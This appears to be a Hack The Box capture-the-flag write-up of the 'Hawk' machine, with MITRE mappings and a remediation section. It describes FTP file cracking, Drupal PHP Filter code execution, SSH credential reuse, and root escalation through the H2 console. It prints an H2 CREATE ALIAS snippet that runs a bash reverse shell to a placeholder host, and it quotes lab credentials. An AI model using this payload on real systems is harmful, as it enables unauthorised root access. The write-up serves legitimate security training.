---
title: "Hack The Box Writeup: Hawk"
date: 2025-12-18
description: "Multi-stage attack involving FTP encryption cracking, Drupal RCE, and H2 Database exploitation."
tags: ["htb", "drupal", "h2-database", "encryption", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

**Hawk** was compromised through a chain involving **credential exposure via FTP**, **RCE in Drupal**, and **remote command execution in the H2 Database Console**. The attack resulted in lateral movement via SSH and final escalation to **root** by abusing the H2 service.

### Attack Chain (PTES Mapping)

#### 1. Discovery & Encryption Cracking
Anonymous FTP access provided an encrypted file `.drupal.txt.enc`. Using `bruteforce-salted-openssl`, the password "friends" was identified, revealing Drupal credentials.
* **MITRE Technique:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

#### 2. Initial Access (Drupal)
The "PHP Filter" module was enabled within the Drupal admin panel, allowing the execution of an arbitrary reverse shell.
* **MITRE Technique:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 3. Lateral Movement & PrivEsc
SSH credential reuse (`daniel:drupal4hawk`) allowed shell access. Local enumeration identified the **H2 Database Console** running on port 8082. Using **SSH port forwarding**, the console was accessed and exploited via `CREATE ALIAS` (Exploit-DB #45506).
```sql
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws ...$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/<IP>/4444 0>&1')
```
Since H2 was running as root, the resulting shell was privileged.
* **MITRE Technique:** [T1090](https://attack.mitre.org/techniques/T1090/) - Connection Proxy.

### Remediation (NIST SP 800-115)

* **Service Security:** Disable anonymous FTP and restrict dangerous CMS modules (PHP Filter).
* **Identity Management:** Enforce unique passwords across all services.
* **Least Privilege:** Do not run administrative consoles (like H2) with root privileges.